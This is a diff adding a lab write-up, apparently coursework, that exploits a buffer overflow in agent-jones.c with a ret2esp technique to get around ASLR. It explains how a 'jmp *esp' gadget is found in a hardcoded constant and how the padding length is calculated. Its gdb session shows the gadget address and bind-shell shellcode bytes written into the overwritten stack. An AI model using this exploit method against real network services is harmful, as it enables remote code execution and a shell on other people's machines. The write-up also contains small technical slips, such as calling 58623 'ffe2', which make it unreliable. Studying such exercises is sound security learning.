@@ -1,0 +1,67 @@
+The vulnerability lies in the code of agent-jones.c. We first find a way to bypass the ASLR through the first part of the exploit of ret2esp and then we finish by using a normal buffer overflow to overwrite the RIP.
+
+First off, there is a harcoded decimal value of 58623. This value corresponds to the instruction sequence jmp *esp because 58623 is ffe2 (hex) in a little endian system and ffe2 is jmp *esp . Using the number that is contained in agent-jones.c we can follow the ret2esp exploit mentioned in "ASLR Smack & Laugh Reference". 
+
+The exploit involves determining the address of the 58623 and therefore the address of jmp *esp. Once we have the address of the jmp *esp (looked up through gdb), we can have egg.c be used to output three things to the netcat server listening on a port: 1. the padding needed to fill the 1760 byte buffer declared in handle() function + overhead up until the $ebp(12 bytes) = 1772 bytes, 2. the 4 byte address of the jmp $esp command, 2. and then lastly the bind shell code.
+
+Here are the commands I used in gdb to determine the addresses:
+
+jones@pwnable:~$ invoke -d agent-jones
+(gdb) break io
+(gdb) disass magic
+Dump of assembler code for function magic:
+   0x08048604 <+0>:	push   %ebp
+   0x08048605 <+1>:	mov    %esp,%ebp
+   0x08048607 <+3>:	mov    0xc(%ebp),%eax
+   0x0804860a <+6>:	shl    $0x3,%eax
+   0x0804860d <+9>:	xor    %eax,0x8(%ebp)
+   0x08048610 <+12>:	mov    0x8(%ebp),%eax
+   0x08048613 <+15>:	shl    $0x3,%eax
+   0x08048616 <+18>:	xor    %eax,0xc(%ebp)
+   0x08048619 <+21>:	orl    $0xe4ff,0x8(%ebp)
+(gdb) x/i 0x08048619
+   0x8048619 <magic+21>:	orl    $0xe4ff,0x8(%ebp)
+(gdb) x/i 0x0804861c
+   0x804861c <magic+24>:	jmp    *%esp
+(gdb) run 1337
+
+
+
+Starting program: /home/jones/agent-jones 1337
+
+Breakpoint 1, io (socket=8, n=1760, buf=0xbffff530 "") at agent-jones.c:28
+28	  recv(socket, buf, n << 3, MSG_WAITALL);
+(gdb) p $ebp
+$3 = (void *) 0xbffffc18
+(gdb) x/20x buf
+0xbffff530:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff540:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff550:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff560:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff570:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/20x 0xbffffc18
+0xbffffc18:	0xbffffc78	0x080488cc	0x00000008	0xbffffc44
+0xbffffc28:	0xbffffc40	0xbffffc64	0x00000004	0x08049ff4
+0xbffffc38:	0x00000002	0x08048465	0x00000010	0xba9f0002
+0xbffffc48:	0x0100007f	0x00000000	0x00000000	0x39050002
+0xbffffc58:	0x00000000	0x00000000	0x00000000	0x00000001
+(gdb) break agent-jones.c:32
+Breakpoint 2 at 0x80486ec: file agent-jones.c, line 32.
+(gdb) c
+Continuing.
+
+Breakpoint 2, io (socket=8, n=1760, buf=0xbffff530 '\027' <repeats 200 times>...)
+    at agent-jones.c:32
+32	  return i;
+(gdb) x/20x buf
+0xbffff530:	0x17171717	0x17171717	0x17171717	0x17171717
+0xbffff540:	0x17171717	0x17171717	0x17171717	0x17171717
+0xbffff550:	0x17171717	0x17171717	0x17171717	0x17171717
+0xbffff560:	0x17171717	0x17171717	0x17171717	0x17171717
+0xbffff570:	0x17171717	0x17171717	0x17171717	0x17171717
+(gdb) x/20x 0xbffffc18
+0xbffffc18:	0x55555555	0x0804861c	0xe3f7db31	0x6a534353
+0xbffffc28:	0xb0e18902	0x5b80cd66	0x0268525e	0x6a0a1a00
+0xbffffc38:	0x89505110	0x58666ae1	0x418980cd	0xb004b304
+0xbffffc48:	0x4380cd66	0x80cd66b0	0x3f6a5993	0x4980cd58
+0xbffffc58:	0x2f68f879	0x6868732f	0x6e69622f	0x5350e389
